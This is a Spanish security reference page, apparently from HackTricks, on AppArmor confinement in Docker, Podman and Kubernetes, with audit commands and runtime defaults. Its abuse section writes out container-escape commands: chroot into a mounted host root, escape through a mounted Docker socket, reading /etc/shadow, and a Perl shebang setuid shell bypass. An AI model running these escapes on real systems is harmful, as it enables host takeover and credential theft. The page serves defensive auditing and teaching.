# AppArmor

{{#include ../../../../banners/hacktricks-training.md}}

## Resumen

AppArmor es un sistema de Control de Acceso Obligatorio (Mandatory Access Control) que aplica restricciones mediante perfiles por programa. A diferencia de las comprobaciones DAC tradicionales, que dependen en gran medida de la propiedad de usuario y grupo, AppArmor permite que el kernel aplique una política asociada al propio proceso. En entornos de contenedores esto importa porque una carga de trabajo puede tener suficientes privilegios tradicionales para intentar una acción y aun así ser denegada porque su perfil de AppArmor no permite la ruta, el montaje, el comportamiento de red o el uso de capability relevante.

El punto conceptual más importante es que AppArmor está basado en rutas. Evalúa el acceso al sistema de archivos mediante reglas basadas en rutas en lugar de mediante etiquetas, como hace SELinux. Eso lo hace más accesible y potente, pero también implica que los bind mounts y las disposiciones alternativas de rutas merecen atención cuidadosa. Si el mismo contenido del host se vuelve accesible bajo una ruta diferente, el efecto de la política puede no ser el que el operador esperaba inicialmente.

## Papel en el aislamiento de contenedores

Las revisiones de seguridad de contenedores a menudo se detienen en capabilities y seccomp, pero AppArmor sigue siendo importante después de esas comprobaciones. Imagina un contenedor que tiene más privilegios de los que debería, o una carga de trabajo que necesitó una capability adicional por razones operativas. AppArmor aún puede limitar el acceso a archivos, el comportamiento de montaje, la red y los patrones de ejecución de formas que bloquean la vía de abuso más obvia. Por eso deshabilitar AppArmor "solo para que la aplicación funcione" puede, silenciosamente, transformar una configuración meramente arriesgada en una que sea activamente explotable.

## Laboratorio

Para comprobar si AppArmor está activo en el host, usa:
```bash
aa-status 2>/dev/null || apparmor_status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled 2>/dev/null
```
Para ver bajo qué usuario se está ejecutando el proceso actual del contenedor:
```bash
docker run --rm ubuntu:24.04 cat /proc/self/attr/current
docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
```
La diferencia es ilustrativa. En el caso normal, el proceso debería mostrar un contexto de AppArmor vinculado al perfil elegido por el runtime. En el caso unconfined, esa capa adicional de restricción desaparece.

También puedes inspeccionar lo que Docker cree que aplicó:
```bash
docker inspect <container> | jq '.[0].AppArmorProfile'
```
## Uso en tiempo de ejecución

Docker puede aplicar un perfil de AppArmor por defecto o personalizado cuando el host lo soporta. Podman también puede integrarse con AppArmor en sistemas basados en AppArmor, aunque en distribuciones con SELinux como prioridad el otro sistema MAC suele tomar protagonismo. Kubernetes puede exponer la política de AppArmor a nivel de workload en los nodes que realmente soportan AppArmor. LXC y los entornos de system-container de la familia Ubuntu también usan AppArmor extensivamente.

El punto práctico es que AppArmor no es una "característica de Docker". Es una característica del kernel del host que varios runtimes pueden decidir aplicar. Si el host no lo soporta o al runtime se le indica ejecutar unconfined, la supuesta protección no está realmente presente.

Para Kubernetes específicamente, la API moderna es `securityContext.appArmorProfile`. Desde Kubernetes `v1.30`, las antiguas anotaciones beta de AppArmor están deprecadas. En hosts con soporte, `RuntimeDefault` es el perfil por defecto, mientras que `Localhost` apunta a un perfil que ya debe estar cargado en el node. Esto importa durante la revisión porque un manifiesto puede aparentar ser consciente de AppArmor mientras depende totalmente del soporte y los perfiles precargados en el node.

Un detalle operativo sutil pero útil es que establecer explícitamente `appArmorProfile.type: RuntimeDefault` es más estricto que simplemente omitir el campo. Si el campo se establece explícitamente y el node no soporta AppArmor, la admisión debería fallar. Si se omite el campo, el workload puede aún ejecutarse en un node sin AppArmor y simplemente no recibir esa capa extra de confinamiento. Desde el punto de vista de un atacante, esta es una buena razón para comprobar tanto el manifiesto como el estado real del node.

En hosts con AppArmor y soporte para Docker, el valor por defecto más conocido es `docker-default`. Ese perfil se genera a partir de la plantilla de AppArmor de Moby y es importante porque explica por qué algunas PoCs basadas en capabilities todavía fallan en un container por defecto. En términos generales, `docker-default` permite la conectividad de red ordinaria, deniega escrituras en gran parte de `/proc`, deniega acceso a partes sensibles de `/sys`, bloquea operaciones de montaje y restringe ptrace de modo que no sea una primitiva general para sondear el host. Entender esa línea base ayuda a distinguir "el container tiene `CAP_SYS_ADMIN`" de "el container puede realmente usar esa capability contra las interfaces del kernel que me interesan".

## Gestión de perfiles

Los perfiles de AppArmor suelen almacenarse bajo `/etc/apparmor.d/`. Una convención de nombres común es reemplazar las barras en la ruta del ejecutable por puntos. Por ejemplo, un perfil para `/usr/bin/man` suele almacenarse como `/etc/apparmor.d/usr.bin.man`. Este detalle importa tanto en defensa como en evaluación porque una vez conoces el nombre del perfil activo, a menudo puedes localizar rápidamente el archivo correspondiente en el host.

Los comandos útiles de gestión en el host incluyen:
```bash
aa-status
aa-enforce
aa-complain
apparmor_parser
aa-genprof
aa-logprof
aa-mergeprof
```
La razón por la que estos comandos importan en una referencia de seguridad de contenedores es que explican cómo se construyen, cargan, cambian a complain mode y se modifican los perfiles después de cambios en la aplicación. Si un operador tiene la costumbre de mover perfiles a complain mode durante la resolución de problemas y se olvida de restaurar enforcement, el contenedor puede parecer protegido en la documentación mientras que en realidad se comporta de forma mucho más laxa.

### Creación y actualización de perfiles

`aa-genprof` puede observar el comportamiento de la aplicación y ayudar a generar un perfil de forma interactiva:
```bash
sudo aa-genprof /path/to/binary
/path/to/binary
```
`aa-easyprof` puede generar un perfil de plantilla que luego puede cargarse con `apparmor_parser`:
```bash
sudo aa-easyprof /path/to/binary
sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
```
Cuando el binario cambia y la política necesita actualizarse, `aa-logprof` puede reproducir las denegaciones encontradas en los registros y ayudar al operador a decidir si permitirlas o denegarlas:
```bash
sudo aa-logprof
```
### Registros

Las denegaciones de AppArmor suelen ser visibles a través de `auditd`, syslog, o herramientas como `aa-notify`:
```bash
sudo aa-notify -s 1 -v
```
Esto es útil operacionalmente y ofensivamente. Los defensores lo usan para refinar perfiles. Los atacantes lo usan para saber qué ruta u operación exacta está siendo denegada y si AppArmor es el control que bloquea una cadena de explotación.

### Identificar el archivo de perfil exacto

Cuando un runtime muestra un nombre de perfil de AppArmor específico para un contenedor, suele ser útil mapear ese nombre al archivo de perfil en disco:
```bash
docker inspect <container> | grep AppArmorProfile
find /etc/apparmor.d/ -maxdepth 1 -name '*<profile-name>*' 2>/dev/null
```
Esto es especialmente útil durante la revisión desde el host porque salva la brecha entre "el contenedor indica que se está ejecutando bajo el perfil `lowpriv`" y "las reglas reales residen en este archivo específico que puede auditarse o recargarse".

### Reglas de alto impacto para auditar

Cuando puedas leer un perfil, no te quedes únicamente en las líneas `deny`. Varios tipos de reglas cambian de forma material cuánto será útil AppArmor frente a un intento de escape del contenedor:

- `ux` / `Ux`: ejecuta el binario objetivo sin confinamiento. Si un helper, shell o intérprete alcanzable está permitido bajo `ux`, eso suele ser lo primero que hay que probar.
- `px` / `Px` y `cx` / `Cx`: realizan transiciones de perfil en exec. No son automáticamente malas, pero vale la pena auditarlas porque una transición puede terminar en un perfil mucho más amplio que el actual.
- `change_profile`: permite que una tarea cambie a otro perfil cargado, inmediatamente o en el siguiente exec. Si el perfil de destino es más débil, esto puede convertirse en la vía de escape prevista desde un dominio restrictivo.
- `flags=(complain)`, `flags=(unconfined)`, o el más nuevo `flags=(prompt)`: estos deberían cambiar el nivel de confianza que depositas en el perfil. `complain` registra las denegaciones en lugar de aplicarlas, `unconfined` elimina la barrera, y `prompt` depende de una ruta de decisión en espacio de usuario en lugar de una denegación aplicada puramente por el kernel.
- `userns` or `userns create,`: las políticas más nuevas de AppArmor pueden mediar la creación de user namespaces. Si un perfil de contenedor lo permite explícitamente, los user namespaces anidados siguen siendo posibles incluso cuando la plataforma usa AppArmor como parte de su estrategia de hardening.

Grep útil en el host:
```bash
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```
Este tipo de auditoría suele ser más útil que quedarse mirando cientos de reglas de archivos ordinarias. Si un breakout depende de ejecutar un helper, entrar en un nuevo namespace, o escapar a un profile menos restrictivo, la respuesta suele estar oculta en estas reglas orientadas a transiciones en lugar de en las obvias líneas del estilo `deny /etc/shadow r`.

## Misconfiguraciones

El error más obvio es `apparmor=unconfined`. Los administradores a menudo lo activan mientras depuran una aplicación que falló porque el profile bloqueó correctamente algo peligroso o inesperado. Si la bandera permanece en producción, toda la capa MAC queda efectivamente eliminada.

Otro problema sutil es suponer que los bind mounts son inofensivos porque los permisos de archivos parecen normales. Dado que AppArmor es path-based, exponer host paths bajo ubicaciones de montaje alternas puede interactuar mal con las reglas basadas en paths. Un tercer error es olvidar que el nombre de un profile en un archivo de configuración significa muy poco si el kernel del host no está realmente aplicando AppArmor.

## Abuso

Cuando AppArmor no está presente, operaciones que antes estaban restringidas pueden funcionar de repente: leer rutas sensibles a través de bind mounts, acceder a partes de procfs o sysfs que deberían haber sido más difíciles de usar, realizar acciones relacionadas con mount si capabilities/seccomp también lo permiten, o usar paths que un profile normalmente denegaría. AppArmor suele ser el mecanismo que explica por qué un intento de breakout basado en capacidades "should work" en teoría pero aún falla en la práctica. Elimina AppArmor, y el mismo intento puede empezar a tener éxito.

Si sospechas que AppArmor es lo principal que impide una cadena de abuso basada en path-traversal, bind-mount o mount-based, el primer paso suele ser comparar qué se vuelve accesible con y sin un profile. Por ejemplo, si un host path está montado dentro del contenedor, comienza comprobando si puedes recorrer y leerlo:
```bash
cat /proc/self/attr/current
find /host -maxdepth 2 -ls 2>/dev/null | head
find /host/etc -maxdepth 1 -type f 2>/dev/null | head
```
Si el container también tiene una capability peligrosa como `CAP_SYS_ADMIN`, una de las pruebas más prácticas es comprobar si AppArmor es el control que está bloqueando las operaciones de mount o el acceso a sensitive kernel filesystems:
```bash
capsh --print | grep cap_sys_admin
mount | head
mkdir -p /tmp/testmnt
mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
```
En entornos donde una ruta del host ya está disponible a través de un bind mount, perder AppArmor también puede convertir un problema de divulgación de información de solo lectura en acceso directo a archivos del host:
```bash
ls -la /host/root 2>/dev/null
cat /host/etc/shadow 2>/dev/null | head
find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
```
El objetivo de estos comandos no es que AppArmor por sí solo cree el breakout. Es que, una vez que AppArmor se elimina, muchas filesystem and mount-based abuse paths se vuelven inmediatamente testables.

### Ejemplo completo: AppArmor deshabilitado + Host Root Mounted

Si el container ya tiene la host root bind-mounted en `/host`, eliminar AppArmor puede convertir un blocked filesystem abuse path en un host escape completo:
```bash
cat /proc/self/attr/current
ls -la /host
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Una vez que el shell se está ejecutando a través del sistema de archivos del host, la carga de trabajo ha escapado efectivamente del límite del contenedor:
```bash
id
hostname
cat /etc/shadow | head
```
### Ejemplo completo: AppArmor deshabilitado + Runtime Socket

Si la verdadera barrera era AppArmor protegiendo el estado en runtime, un socket montado puede ser suficiente para un escape completo:
```bash
find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
La ruta exacta depende del punto de montaje, pero el resultado final es el mismo: AppArmor ya no impide el acceso a la API de runtime, y la API de runtime puede lanzar un contenedor que compromete el sistema anfitrión.

### Ejemplo completo: Bypass de bind-mount basado en la ruta

Porque AppArmor está basado en rutas, proteger `/proc/**` no protege automáticamente el mismo contenido procfs del host cuando es accesible a través de una ruta diferente:
```bash
mount | grep '/host/proc'
find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
cat /host/proc/sys/kernel/core_pattern 2>/dev/null
```
El impacto depende exactamente de qué esté montado y de si la ruta alternativa también elude otros controles, pero este patrón es una de las razones más claras por las que AppArmor debe evaluarse junto con la disposición de puntos de montaje en lugar de hacerlo de forma aislada.

### Ejemplo completo: Shebang Bypass

La política de AppArmor a veces apunta a la ruta de un intérprete de manera que no contempla por completo la ejecución de scripts mediante el manejo de shebang. Un ejemplo histórico implicó usar un script cuya primera línea apunta a un intérprete confinado:
```bash
cat <<'EOF' > /tmp/test.pl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
EOF
chmod +x /tmp/test.pl
/tmp/test.pl
```
Este tipo de ejemplo es importante como recordatorio de que la intención del perfil y la semántica real de ejecución pueden divergir. Al revisar AppArmor en entornos de contenedores, las cadenas de intérpretes y las rutas de ejecución alternativas merecen especial atención.

## Comprobaciones

El objetivo de estas comprobaciones es responder rápidamente tres preguntas: ¿está AppArmor habilitado en el host?, ¿está confinado el proceso actual?, y ¿el runtime aplicó realmente un perfil a este contenedor?
```bash
cat /proc/self/attr/current                         # Current AppArmor label for this process
aa-status 2>/dev/null                              # Host-wide AppArmor status and loaded/enforced profiles
docker inspect <container> | jq '.[0].AppArmorProfile'   # Profile the runtime says it applied
find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50   # Host-side profile inventory when visible
cat /sys/kernel/security/apparmor/profiles 2>/dev/null | sort | head -n 50   # Loaded profiles straight from securityfs
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```
Lo interesante aquí:

- Si `/proc/self/attr/current` muestra `unconfined`, la carga de trabajo no se beneficia del confinamiento de AppArmor.
- Si `aa-status` muestra AppArmor deshabilitado o no cargado, cualquier nombre de perfil en la configuración del runtime es principalmente cosmético.
- Si `docker inspect` muestra `unconfined` o un perfil personalizado inesperado, eso suele ser la razón por la que un vector de abuso basado en el sistema de archivos o montajes funciona.
- Si `/sys/kernel/security/apparmor/profiles` no contiene el perfil que esperabas, la configuración del runtime u orquestador no es suficiente por sí sola.
- Si un perfil supuestamente endurecido contiene `ux`, amplias `change_profile`, `userns` o reglas del estilo `flags=(complain)`, el límite práctico puede ser mucho más débil de lo que sugiere el nombre del perfil.

Si un contenedor ya tiene privilegios elevados por motivos operativos, dejar AppArmor habilitado a menudo marca la diferencia entre una excepción controlada y una falla de seguridad mucho más amplia.

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Enabled by default on AppArmor-capable hosts | Uses the `docker-default` AppArmor profile unless overridden | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Podman | Host-dependent | AppArmor is supported through `--security-opt`, but the exact default is host/runtime dependent and less universal than Docker's documented `docker-default` profile | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Kubernetes | Conditional default | If `appArmorProfile.type` is not specified, the default is `RuntimeDefault`, but it is only applied when AppArmor is enabled on the node | securityContext.appArmorProfile.type: Unconfined, securityContext.appArmorProfile.type: Localhost con un perfil débil, nodos sin soporte de AppArmor |
| containerd / CRI-O under Kubernetes | Follows node/runtime support | Common Kubernetes-supported runtimes support AppArmor, but actual enforcement still depends on node support and workload settings | Same as Kubernetes row; direct runtime configuration can also skip AppArmor entirely |

Para AppArmor, la variable más importante suele ser el **host**, no solo el runtime. Una configuración de perfil en un manifiesto no crea confinamiento en un nodo donde AppArmor no está habilitado.

## References

- [Kubernetes security context: AppArmor profile fields and node-support behavior](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [Ubuntu 24.04 `apparmor.d(5)` manpage: exec transitions, `change_profile`, `userns`, and profile flags](https://manpages.ubuntu.com/manpages/noble/en/man5/apparmor.d.5.html)
{{#include ../../../../banners/hacktricks-training.md}}
